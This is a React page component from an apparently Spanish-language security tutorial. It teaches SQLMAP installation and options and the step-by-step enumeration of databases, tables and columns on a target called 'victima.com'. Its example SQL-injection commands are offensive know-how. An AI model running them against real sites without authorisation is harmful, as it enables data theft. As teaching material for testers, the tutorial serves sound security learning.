import React from "react";

import Comand from "../../../Comand";
import Img from "../../../Img";

//Imagenes
import Img_One from "./../../../../sources/imgs/SQLMAP/SQLMAP_01.png";
import Img_Two from "./../../../../sources/imgs/SQLMAP/SQLMAP_02.png";


import icon_directory_pink from "./../../../../sources/icons/icon-directory-pink.svg";
import icon_directory from "./../../../../sources/icons/icon-directory.svg";

export default function SQLMAP (props) {
    return (
        <>
            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory_pink} alt=""/>
                <span className="span-pink"> SQLMAP.<span className="span-pink cursor">_</span>
                </span>
            </h3>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue">Introducción a SQLMAP.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                <span className="span-yellow">SQLMAP</span> es una <span className="span-white">herramienta de código abierto</span> escrita en <span className="span-pink">Python</span> que <span className="span-blue">automatiza la detección</span> y <span className="span-blue">explotación</span> de <span className="span-white">vulnerabilidades de inyección SQL</span> en aplicaciones web. Su principal <span className="span-pink">objetivo</span> es <span className="span-blue">ayudar a los testers a identificar fallos de seguridad en bases de datos a través de inyecciones SQL</span>, y <span className="span-blue">extraer información como nombres de bases de datos, tablas, columnas</span>, y <span className="span-blue">datos confidenciales</span>.
            </p>

            <p>
                Funcionalidades clave:
            </p>

            <ul className="ol-code">
                <li>
                    <p>
                        <span className="span-yellow">Detección</span> y <span className="span-yellow">explotación</span> de <span className="span-pink">múltiples tipos de SQL Injection</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-yellow">Soporte para bases de datos</span> como <span className="span-pink">MySQL, Oracle, PostgreSQL, MSSQL, SQLite</span>, etc.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-yellow">Capacidad para tomar control de sistemas de bases de datos</span> mediante ejecución de comandos del sistema operativo.
                    </p>
                </li>

                <li>
                    <p>
                       <span className="span-yellow"> Integración con TOR y proxies</span> para anonimato.
                    </p>
                </li>
            </ul>

            <p>
                El comando base para ejecutar cualquier instruccion de SQLMAP es:
            </p>
            
            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap"
            />

            <p>Imagen de referencia:</p>

            <Img
                img = {Img_One}
                alt = {"Imagen 1. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"1. Comando principal de SQLMAP."}
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue">Instalación de SQLMAP.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                En <span className="span-yellow">Kali Linux</span>, <span className="span-yellow">SQLMAP</span> generalmente viene <span className="span-white">preinstalado</span>. Para <span className="span-white">verificarlo</span>, usa el comando <i className="span-white">`-h`</i> para obtener <span className="span-pink"> ayuda de información</span>:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -h"
            />

            <p>Imagen de referencia:</p>

            <Img
                img = {Img_Two}
                alt = {"Imagen 2. SQLMAP."}
                title = {"Descripcción de imagen."}
                text = {"2. Comando de informacion de SQLMAP."}
            />

            <p>
                Si por algún motivo <span className="span-yellow">SQLMAP</span> <span className="span-pink">NO</span> se encuentra instalado, puede hacerlo clonando su repositorio de <span className="span-white">GitHub</span>:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap"
            />

            <p>
                Y Ejecutando el <i className="span-white">.py</i>.
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "python3 sqlmap.py -h"
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue">Uso básico de SQLMAP.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                El comando basico y principal para el uso de <span className="span-yellow">SQLMAP</span>, es:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -u <ip-dominio> --opciones"
            />

            <p>
                <span className="span-yellow">Nota:</span> Si realizaste la clonación desde <span className="span-white">github</span>, no olvides utilizar al inicio de los comandos <i className="span-white">python3</i>.
            </p>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue">SQLMAP con --batch.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
               Si utilizamos el parametro <i className="span-white">--batch</i>, este significa que <span className="span-pink">aceptamos todas las opciones por defecto</span> (modo no interactivo).
            </p>

            <p>
                <span className="span-pink">SQLMAP</span> <span className="span-pink">detectará automáticamente</span> la <span className="span-blue">vulnerabilidad</span> y el <span className="span-blue">tipo de inyección</span>.
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -u <ip-dominio> --batch"
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Configuración de nivel de profundidad.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                <span className="span-yellow">SQLMAP</span> permite <span className="span-blue">realizar pruebas</span> y <span className="span-blue">ataques</span> configurando el grado de <span className="span-white">nivel de intensidad de pruebas</span> , para ello, utilizamos el <span className="span-pink">parametro</span>:
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -u <ip-dominio> --level=<nivel-profundidad>"
            />

            <p>
                <span className="span-yellow">Nota:</span> El <span className="span-white">nivel de intensidad</span> va desde el <span className="span-blue">1</span> hasta eñ <span className="span-blue">5</span>.
            </p>

            <p>Un ejemplo de comando</p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -u 192.168.0.105 --level=5"
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Configuración de nivel de riesgo.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Ademas de el <span className="span-white">nivel de intensidad</span>, <span className="span-yellow">SQLMAP</span> permite tambien la configuración de <span className="span-white">nivel de riesgo</span>.
            </p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -u <ip-dominio> --risk=<nivel-riesgo>"
            />

            <p>
                <span className="span-yellow">Nota:</span> El <span className="span-white">nivel de riesgo</span> va desde el <span className="span-blue">1</span> hasta eñ <span className="span-blue">3</span>.
            </p>

            <p>Un ejemplo de comando</p>

            <Comand
                funcionNotificacion = {props.funcionNotificacion}
                notifications = {props.notifications}
                code = "sqlmap -u 192.168.0.105 --risk=3"
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Enumeración de bases de datos.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Si el <span className="span-white">sitio proporcionado es vulnerable</span> a <span className="span-pink">inyecciones SQL</span>, entonces <span className="span-yellow">SQLMAP</span> podrá trabajar sobre el.
            </p>

            <p>
                Lo <spans className="span-pink">primero a obtener</spans> al realizar una <span className="span-pink">inyección SQL</span>, por lo general es la <span className="span-white">enumeración</span> de las <spa className="span-white">Bases de datos</spa>.
            </p>

            <p>
                Para ello, utilizamos el parametro <i className="span-white">--dbs</i>:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap -u <ip-dominio> --dbs'
            />

            <p>
                Ejemplo:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap -u "http://victima.com/item.php?id=3" --dbs'
            />

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Enumeración de tablas.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Una vez encontrada una <span className="span-white">Base de Datos</span>, podemos proceder a la <span className="span-pink">enumeración de  tablas</span> de dicha.
            </p>

            <p>
                Para ello, realizamos el <span className="span-pink">comando</span> con pequeñas modificaciones:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap -u <ip-dominio> -D <base-datos> --tables'
            />

            <p>
                Ejemplo:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap -u "http://victima.com/item.php?id=3" -D empleados --tables'
            />

            <p>Donde:</p>

            <ul className="ol-code">

                <li>
                    <p>
                        <span className="span-white">&lt;ip-dominio&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la ip o dominio de la url vulnerable</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-D</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de la <span className="span-white">base de datos</span> a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;base-datos&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la <span className="span-white">Base de datos</span> encontrada y desea atacarse</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--tables</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para indicarle a <span className="span-yellow">SQLMAP</span> que deseamos enumerar las tablas de dicha BD</span>.
                    </p>
                </li>
            </ul>

            <p>
                <span className="span-yellow">Nota:</span> En este ejemplo, intentamos obtener las tablas de la base de datos llamada <i className="span-white">empleados</i>.
            </p>

            <h3 className="span-blue">
                <img className="icon-subtitle" src={icon_directory} alt=""/>
                <span className="span-blue"> Obtener de columnas.<span className="span-blue cursor">_</span>
                </span>
            </h3>

            <p>
                Ya obtenida la base de datos y tablas, ahora podemos obtener las columnas.
            </p>

            <p>
                Para ello, ahora realizamos el comando:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap -u <ip-dominio> -D <base-datos> -T <tabla> --columns'
            />

            <p>
                Donde:
            </p>

            <ul className="ol-code">
                <li>
                    <p>
                        <span className="span-white">&lt;ip-dominio&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la ip o dominio de la url vulnerable</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-D</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de la <span className="span-white">base de datos</span> a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;base-datos&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la <span className="span-white">Base de datos</span> encontrada y desea atacarse</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">-T</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para definir el nombre de la <span className="span-white">tabla</span> a hacer referencia</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">&lt;tabla&gt;</span> <span className="span-blue">-></span> <span className="span-pink">Es la <span className="span-white">tabla</span> encontrada y desea atacarse</span>.
                    </p>
                </li>

                <li>
                    <p>
                        <span className="span-white">--columns</span> <span className="span-blue">-></span> <span className="span-pink">Es el parametro para indicarle a <span className="span-yellow">SQLMAP</span> que deseamos enumerar las columnas de una tabla, dentro de una BD</span>.
                    </p>
                </li>
            </ul>

            <p>
                Un ejemplo:
            </p>

            <Comand
                funcionNotificacion={props.funcionNotificacion}
                notifications={props.notifications}
                code='sqlmap -u "http://victima.com/item.php?id=3" -D empleados -T usuarios --columns'
            />

        </>
    );
}